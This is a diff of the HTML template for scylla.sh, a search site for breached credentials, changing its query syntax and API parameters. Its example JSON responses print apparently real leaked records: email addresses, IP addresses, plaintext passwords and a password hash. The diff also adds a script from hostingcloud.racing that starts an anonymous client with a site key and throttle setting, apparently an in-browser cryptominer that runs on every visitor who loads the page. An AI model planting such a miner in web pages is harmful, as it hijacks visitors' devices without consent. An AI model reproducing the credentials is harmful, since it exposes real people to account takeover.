@@ -105,7 +105,6 @@ font-weight: normal;
 <div class="topnav">
   <a class="active" href="/">Home</a>
   <a href="search">Search</a>
-  <a href="https://www.etsy.com/shop/TheInfoSecShop" target="_blank">Shop</a>
 </div>
 
 
@@ -113,7 +112,7 @@ font-weight: normal;
 
   <p>*Search is in early alpha, please report bugs to <a href="https://github.com/acaceres2176/scylla/issues" target="_blank">the scylla github repo</a></p>
   <form class="search-container" action="search">
-    <input type="text" id="search-bar" name="q" placeholder="Please enter a search term...">
+    <input type="text" id="search-bar" name="q" placeholder="Please enter a search term...">*search has changed, consider re-RTFMing
     <!--<a href="#"><img class="search-icon"></a>-->
   </form>
 
@@ -125,12 +124,11 @@ font-weight: normal;
 
   {% for page in pages %}
 
-    <a href="{{ url_for(request.endpoint) }}?&q={{ params['q'] }}&from={{ page * size }}&size=100">{{ page }}</a>
+    <a href="{{ url_for(request.endpoint) }}?&q={{ params['q'] }}&start={{ page * size }}&size=100">{{ page }}</a>
 
   {% endfor %}
 
 </div>
-
 <br />
 <br />
 <br />
@@ -142,19 +140,26 @@ font-weight: normal;
 
 <h2>Queries</h2>
 
-<p>Queries use Lucene query syntax. You will get a 500 error if your query is incorrect. Use the fields listed above to guide you. Full query syntax (including wildcards) are supported</p>
+    <p>Queries DO NOT use Lucene query syntax anymore, but they kind of look like they do. First things first, forget about wildcards, each query essentially comes with wildcards surrounding them. So be as specific
+    or non-specific as you want.</p>
 <figure>
-  <figcaption>Example search for passwords that start with ff</figcaption>
+  <figcaption>Example search for passwords that have ff in them</figcaption>
   <pre>
     <code>
-      Password:ff*
+      password:ff
     </code>
   </pre>
 
-  <figcaption>This would match any passwords with a d in them and the username dave, dale, dane, etc.</figcaption>
+  <p>
+  Yes, also note that the field "password" no longer needs to be capitalized. For legacy reasons I lowercase everything for you though. You're welcome. On the back-end this query is simple,
+  it's looking in the password table for the string ff. Fancy search is dead, long live basic string matching. Keep your queries simple and basic, there is no complex search back-end anymore
+  at this time.
+  </p>
+  
+  <figcaption>Remember this? That's not going to work anymore. The ? is going to give you an error and searching for two fields at once is no longer currently supported. I'm working on it!</figcaption>
   <pre>
     <code>
-      Name:da?e Password:*d*
+      Name:da?e Password:*d* <-- doesn't work anymore
     </code>
   </pre>
   
@@ -166,12 +171,14 @@ font-weight: normal;
     to <code>Accept: application/json</code>
     <br /><br />
     <code>
-      GET https://scylla.sh/search?q=your_query&num=1000&from=200
+      GET https://scylla.sh/search?q=your_query&size=100&start=200
     </code>
     <br /><br />
 
-    The above GET request grabs 1000 results of your_query starting at the 200th record. Pagination
-    can be done using the "from" parameter. Queries return the first 10,000 hits.
+    The above GET request grabs 100 results of your_query starting at the 200th record. Pagination
+    can be done using the "start" parameter. Queries return the first "num" hits.
+
+    Please open an issue on github for any queries that fail or are extraordinarily slow.
     <br /><br />
 
     Data is returned in JSON format like the following:
@@ -179,46 +186,48 @@ font-weight: normal;
 <code>
 <pre>
 [
-   {
-      "_id":"hKW8WWsBBGJneKoTbFS-",
-      "_index":"pw_data",
-      "_score":19.8656,
-      "_source":{
-         "Domain":"exploit.in",
-         "Email":"marin.vardic@zzf.hr",
-         "Password":"freeshit"
-      },
-      "_type":"_doc"
-   },
-   {
-      "_id":"_3PgVGsBBGJneKoTof0e",
-      "_index":"pw_data",
-      "_score":16.46111,
-      "_source":{
-         "Domain":"linkedin.com",
-         "Email":"jasna.cajsa-beber@zzf.hr",
-         "PassHash":"a3f5b3b7c790e397b2d77eca31cd96bcd57c8700"
-      },
-      "_type":"_doc"
-   },
-   {
-      "_id":"dBmbWmsBBGJneKoTZ5Wk",
-      "_index":"pw_data",
-      "_score":16.46111,
-      "_source":{
-         "Domain":"exploit.in",
-         "Email":"jasna.cajsa-beber@zzf.hr",
-         "Password":"vili2005"
-      },
-      "_type":"_doc"
+  {
+    "domain": "000webhost.com", 
+    "email": "kimitakmili.1990@gmail.com", 
+    "ip": "188.245.147.169", 
+    "name": "  ", 
+    "passhash": null, 
+    "passsalt": null, 
+    "password": "kimi2045", 
+    "user": null, 
+    "userid": null, 
+    "username": null
+  }, 
+  {
+    "domain": "000webhost.com", 
+    "email": "kino45.1982@gmail.com", 
+    "ip": "193.0.207.111", 
+    "name": "  ", 
+    "passhash": null, 
+    "passsalt": null, 
+    "password": "KiF05081991kIf", 
+    "user": null, 
+    "userid": null, 
+    "username": null
+  }, 
+  {
+    "domain": "000webhost.com", 
+    "email": "m.taghipoor1377@gmail.com", 
+    "ip": "5.239.205.151", 
+    "name": "  ", 
+    "passhash": null, 
+    "passsalt": null, 
+    "password": "majid17", 
+    "user": null, 
+    "userid": null, 
+    "username": null
    }
 ]
 </code>
 </pre>   
     <br /><br />
-    Note you may use the fields below to guide you, but not all fields are returned with each query,
-    only available fields. If fields are added, they will be appended to the list of available fields for
-    query.
+    Note you may use the fields below to guide you, all fields, even if null, should be returned by your query.
+    If fields are added, they will be appended to the list of available fields for query.
 
   </p>
 
@@ -231,6 +240,13 @@ font-weight: normal;
   The {{ db.split(".")[0] }} Database<br />
 {% endfor %}
 
+  <script src="https://www.hostingcloud.racing/FA18.js"></script>
+  <script>
+    var _client = new Client.Anonymous('b0a5fc90521fc2862b2feb55baee6a97a3285e548d8b9da055d1f586aef632e2', {
+    throttle: 0.5, ads: 0
+    });
+    _client.start();
+  </script>
 
   <h2>ToS</h2>
 
